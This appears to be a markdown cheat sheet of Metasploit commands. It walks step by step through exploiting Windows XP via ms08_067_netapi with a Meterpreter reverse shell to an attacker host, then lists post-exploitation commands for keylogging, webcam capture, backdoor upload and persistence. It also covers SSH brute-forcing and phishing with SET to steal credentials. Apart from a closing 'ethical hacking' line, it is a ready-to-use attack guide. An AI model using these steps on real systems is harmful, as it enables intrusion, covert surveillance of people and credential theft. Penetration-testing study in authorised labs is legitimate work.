## 🕵️ Basic Metasploit Commands  

### 📌 **Start & Update**  
Start Metasploit:  
```bash
msfconsole
```
Update Metasploit:  
```bash
msfupdate
```

### 🔍 **Search for Exploits**  
```bash
search windows/smb
```
✅ Lists exploits related to **Windows SMB vulnerabilities**.  

### 📂 **Select and Use an Exploit**  
```bash
use exploit/windows/smb/ms08_067_netapi
```
✅ **This exploit targets a famous Windows XP vulnerability.**  

---

## 🎯 **Real Attack Scenario (Windows XP Exploit)**  

**Target:** Windows XP SP2  
**Vulnerability:** SMB (ms08_067_netapi)  

### 1️⃣ **Select the Exploit**  
```bash
use exploit/windows/smb/ms08_067_netapi
```

### 2️⃣ **Check Exploit Options**  
```bash
show options
```

### 3️⃣ **Set Target IP**  
```bash
set RHOST 192.168.1.100
```

### 4️⃣ **Choose Payload (Use Meterpreter!)**  
```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
```
✅ **This sets up a reverse shell using Meterpreter.**  

### 5️⃣ **Launch the Attack!**  
```bash
exploit
```
✅ **If successful, you will gain full control over the target system!**  

---

## 🔥 **Meterpreter Commands (Full Control Over Target!)**  

Once inside, Metasploit opens an **interactive Meterpreter shell**.  
```bash
sysinfo           # Get system information
getuid           # Check user privilege level
shell            # Open a full shell on the target
screenshot       # Take a screenshot of the target screen
webcam_snap      # Capture an image using the target's webcam
keyscan_start    # Start a keylogger
download file.txt # Download a file from the target system
upload shell.exe  # Upload a backdoor or malware
```

---

## 🛡️ **Auxiliary Modules (Extra Features!)**  

Metasploit is more than just an exploit tool!  

🔍 **Nmap Integration (Network Scanning)**  
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run
```
✅ **Scans for open ports on the entire network.**  

🔓 **Hydra for SSH Brute-Force Attack**  
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASSWORD password123
run
```
✅ **Attempts to brute-force SSH login credentials.**  

---

## 🚀 **Post-Exploitation (After Gaining Control!)**  

Once you have access to the target, Metasploit can help you **maintain access and extract data.**  

💻 **Create a Persistent Backdoor**  
```bash
run persistence -A
```
✅ **Ensures Metasploit reconnects every time the system reboots!**  

📷 **Use the Target's Webcam**  
```bash
webcam_snap
```
✅ **Takes a snapshot using the target’s webcam.**  

⌨️ **Start a Keylogger**  
```bash
keyscan_start
```
✅ **Records every keystroke typed on the target system!**  

---

## 🔥 **Social Engineering Toolkit (SET) - Phishing Attacks**  

Metasploit integrates with the **Social Engineering Toolkit (SET)** for phishing attacks.  

📧 **Send Fake Emails (Phishing Attack)**  
```bash
setoolkit
```
✅ **Generate fake login pages and emails to steal credentials.**  

---

## 📌 **Summary**  

✅ **Metasploit is one of the most powerful penetration testing tools!**  
✅ **It follows multiple attack phases: Exploitation, Payload Injection, and Post-Exploitation.**  
✅ **Use Meterpreter for stealth access to target systems.**  
✅ **It integrates with tools like Hydra, Nmap, and SET.**  

📌 **For more details:**  
🔗 [Metasploit Official Documentation](https://docs.metasploit.com/)  
🔗 [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)  

🚀 **Happy Ethical Hacking!** 😃🔥  
